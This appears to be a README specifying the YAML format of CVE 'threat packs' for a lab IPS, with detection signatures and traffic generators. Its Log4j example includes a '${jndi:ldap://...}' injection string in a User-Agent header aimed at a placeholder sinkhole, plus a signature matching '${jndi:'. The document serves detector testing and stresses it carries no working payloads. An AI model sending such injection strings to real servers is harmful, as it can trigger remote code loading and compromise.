# Threat packs

One file per CVE. A pack holds the metadata, the IPS signatures that detect it and the
traffic generator that sends its detection-relevant shape to a lab stand-in. The FortiGate
IPS in FortiTatake knows only these signatures, so every detection traces back to one pack.

`python3 tools/build_threats.py` checks every pack: each generator variant must trip at least
one of its signatures, and none of the normal office requests may trip any signature.

## Format

```yaml
id: TP-2021-44228            # TP-<year>-<number>
cve: [CVE-2021-44228]
name: Log4j.JNDI.Lookup.Injection   # our own dotted name (no FortiGuard text)
severity: critical           # info | low | medium | high | critical
target: {os: [Linux, Windows], app: [Apache Log4j]}   # used by sensor filters
location: server             # server | client
summary: one paragraph in our own words
references: [https://...]
signatures:
  - id: 9100001              # unique across packs
    proto: tcp
    ports: [80, 443, 8080]
    match:                   # all must hold
      - {buf: header, contains: "${jndi:", nocase: true}
generator:
  port: 80
  tls: false
  variants:
    - name: user-agent
      request: |-            # CRLF line endings are added; placeholders are filled at run time
        GET /?q={{token}} HTTP/1.1
        Host: {{target_host}}
        User-Agent: ${jndi:ldap://{{sinkhole}}/{{token}}}
server_effect: {process: "java -> /bin/sh -c ...", when: allowed}
lesson: one sentence
```

Binary protocols: a condition can be `hex: "ff534d4225"` (bytes, in the raw buffer) and a variant
`request_hex:` instead of `request:`; `protocol: SMB` (default HTTP) is what sensor protocol filters see.

Buffers: `method`, `uri` (request target, percent-decoded once, dot segments kept as sent),
`header` (all header lines), `body`, `raw` (the whole payload). `contains` is a literal;
`regex` is a short regular expression over the buffer.

Placeholders: `{{target_host}}` (the stand-in the generator aims at), `{{sinkhole}}` (a lab
address nobody answers on), `{{token}}` (a per-run marker the Internet relay refuses to carry).

Safety: a pack carries the shape a detector keys on, never a working payload: no gadget
chains, no shellcode, no command that does anything on a real target.
